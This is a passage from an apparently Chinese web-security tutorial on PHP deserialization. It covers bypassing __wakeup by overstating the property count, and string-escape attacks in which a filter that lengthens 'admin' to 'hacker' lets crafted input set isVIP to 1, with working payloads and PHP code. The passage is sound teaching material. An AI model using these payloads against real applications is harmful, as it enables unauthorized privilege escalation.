class=&#34;string&#34;&gt;&amp;quot;Nameusername&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;;s:&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;Namepassword&amp;quot;&lt;/span&gt;;i:&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A4%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A2%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;username%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A5%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;admin%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bs%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A14%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;Name%&lt;span class=&#34;number&#34;&gt;00&lt;/span&gt;password%&lt;span class=&#34;number&#34;&gt;22&lt;/span&gt;%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;Bi%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;A100%&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;B%&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;D&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;当成员属性数目大于实际数目时可绕过 wakeup 方法&lt;/strong&gt;，其次 private 的 %00 是老生常谈了。多说一句，这是一个 CVE 漏洞&lt;/p&gt;
&lt;h4 id=&#34;0x04对象逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#0x04对象逃逸&#34;&gt;#&lt;/a&gt; 0x04 对象逃逸&lt;/h4&gt;
&lt;p&gt;当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生 PHP 反序列化字符逃逸的漏洞。&lt;/p&gt;
&lt;p&gt;对于 PHP 反序列字符逃逸，我们分为以下两种情况进行讨论。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;过滤后字符变多&lt;/li&gt;
&lt;li&gt;过滤后字符变少&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;过滤后字符变多&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过滤后字符变多&#34;&gt;#&lt;/a&gt; 过滤后字符变多&lt;/h5&gt;
&lt;p&gt;设我们先定义一个&lt;strong&gt; user&lt;/strong&gt; 类，然后里面一共有 3 个成员变量：&lt;strong&gt;username&lt;/strong&gt;、&lt;strong&gt;password&lt;/strong&gt;、&lt;strong&gt;isVIP&lt;/strong&gt;。&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;user&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$isVIP&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;isVIP = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;user&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;123456&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//可以看到，由于isVIP在构造函数中被赋值为0，因此序列化后的&amp;quot;isVIP&amp;quot;;i:0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个时候我们增加一个函数，用于对&lt;strong&gt; admin&lt;/strong&gt; 字符进行替换，将&lt;strong&gt; admin&lt;/strong&gt; 替换为&lt;strong&gt; hacker&lt;/strong&gt;，替换函数如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;function filter($s)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    return str_replace(&amp;quot;admin&amp;quot;,&amp;quot;hacker&amp;quot;,$s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这一段程序的输出为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;hacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;那么我们的 admin 就会被替换为 hacker&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;admin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;  //未过滤&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:5:&amp;quot;hacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125; //已过滤&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;仔细看，虽然 admin 变为了 hacker，但长度并没有从 5 变成 6，&lt;strong&gt;因此我们可以使用对象逃逸将 isVIP 变为 1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;在字符变多的对象逃逸中，我们需要构造我们需要的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;    //length=47&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为我们需要逃逸的字符串长度为&lt;strong&gt; 47&lt;/strong&gt;，并且&lt;strong&gt; admin&lt;/strong&gt; 每次过滤之后都会变成&lt;strong&gt; hacker&lt;/strong&gt;，也就是说每出现一次&lt;strong&gt; admin&lt;/strong&gt;，就会多&lt;strong&gt; 1&lt;/strong&gt; 个字符。&lt;/p&gt;
&lt;p&gt;因此我们需要重复 47 遍 admin，这样他过滤 47 遍，我们的目标 payload 就可以完全覆盖了&lt;/p&gt;
&lt;p&gt;因此我们在可控变量处，重复&lt;strong&gt; 47&lt;/strong&gt; 遍&lt;strong&gt; admin&lt;/strong&gt;，然后加上我们逃逸后的目标子串，可控变量修改如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后我们利用代码做拼接形成完整的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;user&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$username&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$password&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$isVIP&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;username = &lt;span class=&#34;variable&#34;&gt;$u&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;password = &lt;span class=&#34;variable&#34;&gt;$p&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;isVIP = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;str_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;hacker&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$s&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;user&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;123456&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//上面的第一个&amp;#x27;&amp;#x27;中是我们构造的目标串，第二个&amp;#x27;&amp;#x27;中是马上要被覆盖的串&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;filter&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a_seri&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:282:&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;由于&lt;strong&gt;反序列化后，多余的子串会被抛弃&lt;/strong&gt;， &lt;code&gt;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125; &lt;/code&gt; 我们可以直接无视&lt;/p&gt;
&lt;p&gt;尝试反序列化验证我们的 isVIP 是否变为了 1&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;O:4:&amp;quot;user&amp;quot;:3:&amp;#123;s:8:&amp;quot;username&amp;quot;;s:282:&amp;quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:1;&amp;#125;&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;;s:5:&amp;quot;isVIP&amp;quot;;i:0;&amp;#125;&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a_seri_filter_unseri&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a_seri_filter&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ 